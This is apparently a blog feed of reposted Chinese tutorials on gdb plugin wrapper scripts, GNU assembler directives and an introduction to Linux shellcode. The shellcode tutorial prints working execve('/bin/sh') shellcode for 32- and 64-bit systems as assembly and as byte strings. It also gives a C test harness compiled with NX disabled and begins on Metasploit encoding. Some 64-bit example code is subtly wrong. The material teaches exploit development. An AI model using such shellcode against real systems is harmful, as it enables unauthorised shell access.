~/.gdbinit_pwndbg</span><br><span class="line">end</span><br><span class="line">document init-pwndbg</span><br><span class="line">Initializes PwnDBG</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define init-gef</span><br><span class="line">source ~/.gdbinit-gef.py</span><br><span class="line">end</span><br><span class="line">document init-gef</span><br><span class="line">Initializes GEF (GDB Enhanced Features)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>Then, create the following 3 files in one of your $PATH folder:<br>然后，分别创建下列三个文件在你的 $PATH 文件夹中（查看$PATH文件夹命令：echo $PATH）：</p><p>First create a file named by gdb-peda and paste the following:<br>首先创建一个名为 gdb-peda 的文件，并将下列内容复制进去：</p><blockquote><p>创建文件指令：sudo touch gdb-peda</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">exec gdb -q -ex init-peda &quot;$@&quot;</span><br></pre></td></tr></table></figure><p>Then gdb-pwndbg:<br>然后是 gdb-pwndbg:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">exec gdb -q -ex init-pwndbg &quot;$@&quot;</span><br></pre></td></tr></table></figure><p>Then gdb-gef:<br>然后是 gdb-gef：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">exec gdb -q -ex init-gef &quot;$@&quot;</span><br></pre></td></tr></table></figure><p>最后分别修改它们的可执行权限：（注：<mark>gdb-* 代表 gdb-gef、gdb-peda、gdb-pwndbg</mark>）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/bin/gdb-*</span><br></pre></td></tr></table></figure><p>然后你就可以使用 gdb-peda, gdb-pwndbg 或 gdb-gef 来运行相应的gdb plugin版了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文转载自：&lt;a href=&quot;https://www.cnblogs.com/welhzh/p/13958736.html&quot;&gt;gdb 的配置、插件plugin与多彩显示 &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;PwnDbg、gef、peda 的自动切换，其实就是切换配置文件：&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="gdb" scheme="https://www.rgzzplus.com/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>Linux汇编之伪指令</title>
    <link href="https://www.rgzzplus.com/2022/08/05/Linux%E6%B1%87%E7%BC%96%E4%B9%8B%E4%BC%AA%E6%8C%87%E4%BB%A4/"/>
    <id>https://www.rgzzplus.com/2022/08/05/Linux%E6%B1%87%E7%BC%96%E4%B9%8B%E4%BC%AA%E6%8C%87%E4%BB%A4/</id>
    <published>2022-08-05T12:56:04.000Z</published>
    <updated>2022-08-05T13:12:06.936Z</updated>
    
    <content type="html"><![CDATA[<p>作者：Reesun<br>链接：<a href="http://blog.chinaunix.net/uid-20548989-id-1667484.html">http://blog.chinaunix.net/uid-20548989-id-1667484.html</a><br>来源：Chinaunix</p><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;hello 32-bit!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $1, %rdi</span><br><span class="line">movl $msg, %rsi</span><br><span class="line">movl $1, %rdx</span><br><span class="line">movl $4, %rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">xorq %rdi, %rdi</span><br><span class="line">movq $60, %rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.section .data</span><br></pre></td></tr></table></figure><p>汇编程序中以<code>.</code>开头的名称并不是指令的助记符，不会被翻译成机器指令，而是给汇编器一些特殊指示，称为汇编指示（Assembler Directive）或伪操作（Pseudo-operation），由于它不是真正的指令所以加个“伪”字。<code>.section</code>指示把代码划分成若干个段（Section），程序被操作系统加载执行时，每个段被加载到不同的地址，操作系统对不同的页面设置不同的读、写、执行权限。</p><p><code>.data</code>段保存程序的数据，是<mark>可读可写</mark>的，相当于C程序的全局变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br></pre></td></tr></table></figure><p><code>.text</code>段保存代码，是<mark>只读和可执行</mark>的，后面那些指令都属于<code>.text</code>段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.globl _start</span><br></pre></td></tr></table></figure><p><code>_start</code>是一个符号（Symbol），符号在汇编程序中<mark>代表一个地址</mark>，可以用在指令中，汇编程序经过汇编器的处理之后，所有的符号都被替换成它所代表的地址值。在C语言中我们通过变量名访问一个变量，其实就是读写某个地址的内存单元，我们通过函数名调用一个函数，其实就是跳转到该函数第一条指令所在的地址，所以变量名和函数名都是符号，本质上是代表内存地址的。</p><p><code>.globl</code>指示告诉汇编器，<code>_start</code>这个符号要被链接器用到，所以要在目标文件的符号表中标记它是一个全局符号（在<a href="http://learn.akae.cn/media/ch18s05.html#asm.relocatable">第 5.1 节 “目标文件”</a>详细解释）。<code>_start</code>就像C程序的<code>main</code>函数一样特殊，是<mark>整个程序的入口</mark>，链接器在链接时会查找目标文件中的<code>_start</code>符号代表的地址，把它设置为整个程序的入口地址，所以每个汇编程序都要提供一个<code>_start</code>符号并且用<code>.globl</code>声明。<strong>如果一个符号没有用<code>.globl</code>声明，就表示这个符号不会被链接器用到</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br></pre></td></tr></table></figure><p>这里定义了<code>_start</code>符号，汇编器在翻译汇编程序时会计算每个数据对象和每条指令的地址，当看到这样一个符号定义时，就<strong>把它后面一条指令的地址作为这个符号所代表的地址</strong>。而<code>_start</code>这个符号又比较特殊，它所<strong>代表的地址是整个程序的入口地址</strong>，所以下一条指令<code>movl $1, %rdi</code>就成了程序中第一条被执行的指令。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;作者：Reesun&lt;br&gt;
链接：&lt;a href=&quot;http://blog.chinaunix.net/uid-20548989-id-1667484.html&quot;&gt;http://blog.chinaunix.net/uid-20548989-id-1667484.html&lt;</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="Linux汇编伪指令" scheme="https://www.rgzzplus.com/tags/Linux%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>Linux—shellcode开发入门</title>
    <link href="https://www.rgzzplus.com/2022/08/05/Linux-shellcode%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"/>
    <id>https://www.rgzzplus.com/2022/08/05/Linux-shellcode%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</id>
    <published>2022-08-05T12:48:42.000Z</published>
    <updated>2022-08-08T14:40:18.770Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="1-什么是-shellcode"><a class="markdownIt-Anchor" href="#1-什么是-shellcode"></a> 1. 什么是 shellcode ？</h1><p>shellcode 通常用机器语言编写，是一段用于软件漏洞而执行的代码，因其目的常常是让攻击者获得目标机器的命令行 shell 而得名。随着发展，shellcode 现在代表将插入到漏洞利用程序中以完成所需任务的任何字节码。</p><h1 id="2-shellcode-原理"><a class="markdownIt-Anchor" href="#2-shellcode-原理"></a> 2. shellcode 原理</h1><h2 id="21-理解系统调用"><a class="markdownIt-Anchor" href="#21-理解系统调用"></a> 2.1 理解系统调用</h2><p>shellcode 通常是一段能够执行某些系统调用的代码，所以直接通过一个int 0x80系统调用，指定想调用的函数的系统调用号（syscall），传入调用函数的参数，即可。</p><p>Linux 操作系统（2.6及更早的内核版本），通常用 <code>int $0x80软中断 + 系统调用号</code>（保存到eax中）来实现系统调用，其<mark>参数传递顺序依次为 ebx、ecx、edx、esi和edi</mark>，返回值存放在eax。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;hello 32-bit!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $len, %edx</span><br><span class="line">movl $msg, %ecx</span><br><span class="line">movl $1, %ebx</span><br><span class="line">movl $4, %eax</span><br><span class="line">int $0x80</span><br><span class="line"></span><br><span class="line">movl $0, %ebx</span><br><span class="line">movl $1, %eax</span><br><span class="line">int $0x80</span><br></pre></td></tr></table></figure><p>编译执行（可编译成 64 位程序）：<mark>用gcc编译，生成目标文件，用ld来链接</mark></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -c hello32.S</span><br><span class="line">$ ld -m elf_i386 -o hello32 hello32.o</span><br><span class="line">$ strace ./hello32                                                                   127 ⨯</span><br><span class="line">execve(<span class="string">&quot;./hello32&quot;</span>, [<span class="string">&quot;./hello32&quot;</span>], 0x7ffd941ae900 /* 61 vars */) = 0</span><br><span class="line">[ Process PID=3197 runs <span class="keyword">in</span> 32 bit mode. ]</span><br><span class="line">write(1, <span class="string">&quot;hello 32-bit!\n&quot;</span>, 14hello 32-bit!</span><br><span class="line">)         = 14</span><br><span class="line"><span class="built_in">exit</span>(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><p>虽然软中断 int 0x80 非常经典，但是由于其性能较差，<strong>在往后的内核中被快速调用指令代替，32 位系统使用 sysenter(对应 sysexit)指令，64 位系统则使用 syscall（对应 sysret）指令。</strong></p><h2 id="22-调用约定"><a class="markdownIt-Anchor" href="#22-调用约定"></a> 2.2 调用约定</h2><p>调用约定是对函数调用时如何传递参数的一种约定。</p><p>（1）内核接口</p><ul><li>x86-32 系统调用约定：Linux系统调用使用寄存器传递参数。<mark>eax 存放系统调用号（syscall_number），ebx、ecx、edx、esi 和 ebp 用于将6个参数传递给系统调用</mark>。返回值保存在 eax 中。所有其它寄存器（包括 EFLAGS）都保存在 int 0x80 中。</li><li>x86-64 系统调用约定：系统调用的参数限制为 6 个，不直接从堆栈上传递任何参数。==rax 存放系统调用号（syscall_namber）。内核接口使用的寄存器有 rdi、rsi、rdx、r10、r8 和 r9。==系统调用通过 syscall 指令完成。除了 rcx、r11 和 eax，其它寄存器都被保留。返回值保存在 rax 中，只有 INTEGER 或者 MEMORY 类型的值才会被传递给内核。、</li></ul><p>（2）用户接口</p><ul><li>x86-32 函数调用约定：<mark>参数通过栈进行传递</mark>。最后一个参数第一个被放入栈中，知道所有的参数都放置完毕，然后执行 call 指令。</li><li>x86-64 函数调用约定：<mark>x86-64 下通过寄存器传递参数</mark>，这样做比栈更有效率。它避免了内存中参数的存取和额外的指令。根据参数类型的不同，会使用寄存器或传参方式。如果参数类型是 <mark>MEMORY</mark>，则在<mark>栈上传递参数</mark>。如果类型是 <mark>INTEGER</mark>，则==顺序使用 rdi、rsi、rdx、rcx、r8 和 r9。==如果多于 6 个参数，则后面的参数将在栈中传递。</li></ul><h3 id="22-32位程序使用-sysenter-的例子"><a class="markdownIt-Anchor" href="#22-32位程序使用-sysenter-的例子"></a> 2.2 *32位程序使用 sysenter 的例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;Hello sysenter!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text </span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $len, %edx</span><br><span class="line">movl $msg, %ecx</span><br><span class="line">movl $1, %ebx</span><br><span class="line">movl $4, %eax</span><br><span class="line">#为sysenter布置栈</span><br><span class="line">pushl $sysenter_ret</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %ebp</span><br><span class="line">movl %esp,%ebp</span><br><span class="line">sysenter</span><br><span class="line"></span><br><span class="line">sysenter_ret:</span><br><span class="line">movl $0, %ebx</span><br><span class="line">movl $1, %eax</span><br><span class="line">#为sysenter布置栈</span><br><span class="line">pushl $sysenter_ret</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %ebp</span><br><span class="line">movl %esp,%ebp</span><br><span class="line">sysenter</span><br></pre></td></tr></table></figure><p>可以看到，为了使用 sysenter 指令，需要<strong>手动为其布置栈</strong>。这是因为 sysenter 返回时，会执行 _kernel_vsyscall 的后半部分（从 0xf7fd5059 开始）。_kernel_vsyscall 封装了 sysenter 调用的规范，是 vDSO 的一部分，而 vDSO 运行程序在用户层中执行代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disasseble __kernel_vsyscall</span><br><span class="line">0xf7fd5050 &lt;+0&gt;:push ecx</span><br><span class="line">0xf7fd5051 &lt;+1&gt;:push edx</span><br><span class="line">0xf7fd5052 &lt;+2&gt;:push ebp</span><br><span class="line">0xf7fd5053 &lt;+3&gt;:movebp,esp</span><br><span class="line">0xf7fd5055 &lt;+5&gt;:sysenter</span><br><span class="line">0xf7fd5057 &lt;+7&gt;:int 0x80</span><br><span class="line">--&gt;0xf7fd5059 &lt;+9&gt;:popebp</span><br><span class="line">0xf7fd505a &lt;+10&gt;:popedx</span><br><span class="line">0xf7fd505b &lt;+11&gt;:pop ecx</span><br><span class="line">0xf7fd505c &lt;+12&gt;:ret</span><br></pre></td></tr></table></figure><p>编译执行（不可编译成 64 位程序）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -c sysenter32.S</span><br><span class="line">$ ld -m elf_i386 -o sysenter sysenter32.o</span><br><span class="line">$ strace ./sysenter</span><br><span class="line">execve(<span class="string">&quot;./sysenter&quot;</span>, [<span class="string">&quot;./sysenter&quot;</span>], 0x7ffe74dda6e0 /* 61 vars */) = 0</span><br><span class="line">[ Process PID=3638 runs <span class="keyword">in</span> 32 bit mode. ]</span><br><span class="line">write(1, <span class="string">&quot;Hello sysenter!\n&quot;</span>, 16Hello sysenter!</span><br><span class="line">)       = 16</span><br><span class="line"><span class="built_in">exit</span>(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><h3 id="23-64位程序使用-syscall-的例子"><a class="markdownIt-Anchor" href="#23-64位程序使用-syscall-的例子"></a> 2.3 *64位程序使用 syscall 的例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii &quot;hello 32-bit!\n&quot;</span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl $1, %rdi</span><br><span class="line">movl $msg, %rsi</span><br><span class="line">movl $1, %rdx</span><br><span class="line">movl $4, %rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">xorq %rdi, %rdi</span><br><span class="line">movq $60, %rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>编译执行（不可编译成 32 位程序）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -c hello64.S</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -o hello64 hello64.o</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">strace ./hello64</span> </span><br><span class="line">execve(&quot;./hello64&quot;, [&quot;./hello64&quot;], 0x7fffe7d694a0 /* 61 vars */) = 0</span><br><span class="line">write(1, &quot;hello 64-bit!\n&quot;, 14hello 64-bit!</span><br><span class="line">)         = 14</span><br><span class="line">exit(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><h1 id="3-编写简单-shellcode"><a class="markdownIt-Anchor" href="#3-编写简单-shellcode"></a> 3. 编写简单 shellcode</h1><p>shellcode 只是一段代码，为了运行和验证，我们通常用<strong>函数指针</strong>或者<strong>内联函数</strong>的方式把它嵌入到C程序中来调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Shellcode length: %d bytes\n&quot;</span>,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    (*(<span class="type">void</span>(*)())shellcode)();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//污染所有寄存器，确保shellcode 在任何环境下都能运行</span></span><br><span class="line">    <span class="comment">/* __asm__(</span></span><br><span class="line"><span class="comment">    &quot;mov %eax, %ebx\n\t&quot;</span></span><br><span class="line"><span class="comment">&quot;mov %eax, %ecx\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %edx\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %esi\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %edi\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;mov %eax, %ebp\n\t&quot;</span></span><br><span class="line"><span class="comment">            &quot;call shellcode&quot;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <a href="http://www.shell-storm.org/shellcode/">shell-storm</a>找一些 shellcode 学习案例，先看一个实现 execve(&quot;/bin/sh&quot;) 的 Linux 32位的程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">; int execve(const char *filename, char *const argv[], char *const envp[])</span><br><span class="line"></span><br><span class="line">xorecx, ecx; ecx = NULL</span><br><span class="line">mulecx; eax and edx = NULL</span><br><span class="line">moval, 11; execve syscall</span><br><span class="line">pushecx; string NULL</span><br><span class="line">push0x68732f2f; &quot;//sh&quot;</span><br><span class="line">push0x6e69622f; &quot;/bin&quot;</span><br><span class="line">movebx, esp; pointer to &quot;/bin/sh\0&quot; string</span><br><span class="line">int0x80; bingo</span><br></pre></td></tr></table></figure><p>首先用 NASM 对这段汇编代码进行编译，然后使用 ld 链接，运行后获得shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf32 tiny_execve_sh.asm</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_i386 tiny_execve_sh.o -o tiny_execve_sh</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./tiny_execve_sh</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">objdump -d tiny_execve_sh           \                                               127 ⨯</span></span><br><span class="line"></span><br><span class="line">tiny_execve_sh：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line">08049000 &lt;_start&gt;:</span><br><span class="line"> 8049000:       31 c9                   xor    %ecx,%ecx</span><br><span class="line"> 8049002:       f7 e1                   mul    %ecx</span><br><span class="line"> 8049004:       b0 0b                   mov    $0xb,%al</span><br><span class="line"> 8049006:       51                      push   %ecx</span><br><span class="line"> 8049007:       68 2f 2f 73 68          push   $0x68732f2f</span><br><span class="line"> 804900c:       68 2f 62 69 6e          push   $0x6e69622f</span><br><span class="line"> 8049011:       89 e3                   mov    %esp,%ebx</span><br><span class="line"> 8049013:       cd 80                   int    $0x80</span><br></pre></td></tr></table></figure><p>为了在 C 程序中使用这段 shellcode，我们需将其 <mark>opcode 提取</mark>出来（我这里 cut:无效的字段范围）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">objdump -d ./tiny_execve_sh|grep <span class="string">&#x27;[0-9a-f]:&#x27;</span>|grep -v <span class="string">&#x27;file&#x27;</span>|<span class="built_in">cut</span> -f2 -d:|<span class="built_in">cut</span> -f1-6 -d<span class="string">&#x27; &#x27;</span>|<span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span>|<span class="built_in">tr</span> <span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27; &#x27;</span>|sed <span class="string">&#x27;s/ $//g&#x27;</span>|sed <span class="string">&#x27;s/ /\\x/g&#x27;</span>|<span class="built_in">paste</span> -d <span class="string">&#x27;&#x27;</span> -s |sed <span class="string">&#x27;s/^/&quot;/&#x27;</span>|sed <span class="string">&#x27;s/$/&quot;/g&#x27;</span></span></span><br><span class="line">&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br></pre></td></tr></table></figure><p>将提取出来的字符放到 C 程序的 shellcode[] 中。需要注意的是，shellcode 作为全局初始化变量，存放在 .data 段中，而编译时默认开启的 NX 保护机制，会将数据所在的内存页标识为不可执行，当程序转入 shellcode 执行时抛出异常。因此，下面需要关闭 NX。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -m32 -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./tiny_execve_sh_shellcode</span></span><br></pre></td></tr></table></figure><p>Linux 64 位的 shellcode 也一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)</span><br><span class="line">;&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">xorrdx, rdx</span><br><span class="line">movqword rbx, &#x27;//bin/sh&#x27;; 0x68732f6e69622f2f</span><br><span class="line">shrrbx, 0x8</span><br><span class="line">pushrbx</span><br><span class="line">movrdi, rsp</span><br><span class="line">pushrax</span><br><span class="line">pushrdi</span><br><span class="line">movrsi, rsp</span><br><span class="line">moval, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">nasm -f elf64 tiny_execve_sh64.asm</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">ld -m elf_x86_64 tiny_execve_sh64.o -o tiny_execve_sh64</span> </span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./tiny_execve_sh64</span> </span><br></pre></td></tr></table></figure><h1 id="4-shellcode-变形"><a class="markdownIt-Anchor" href="#4-shellcode-变形"></a> 4. shellcode 变形</h1><p>有时，被注入进程的 shellcode 会被限制使用某些字符，例如不能有 NULL、只能用字母和数字等可见字符、ASCII 和 Unicode 编码转换等，因此需要进行一些处理。</p><p>由于 NULL 会将字符串操作函数截断，所以我们需要用其它相似功能的指令来替代，下面是一个 32 位指令替换的例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">替换前：</span><br><span class="line">B8 01000000 MOVEAX,1</span><br><span class="line"></span><br><span class="line">替换后：</span><br><span class="line">33C0XOR EAX,EAX</span><br><span class="line">40INC EAX</span><br></pre></td></tr></table></figure><p>对于只能使用可见字符字母（也就是只能用字母和数字组合）的情况，将 shellcode 的字符进行编码，使其符合限制条件。相应地，需要在 shellcode 中加入解码器，在代码行前将原始 shellcode 还原出来。</p><p>著名的渗透测试框架 Metasploit 中就集成了许多 shellcode 的编码器，这里我们选择 x86/alpha_mixed 来编码 32 位的 shellcode。</p><figure class="highlight 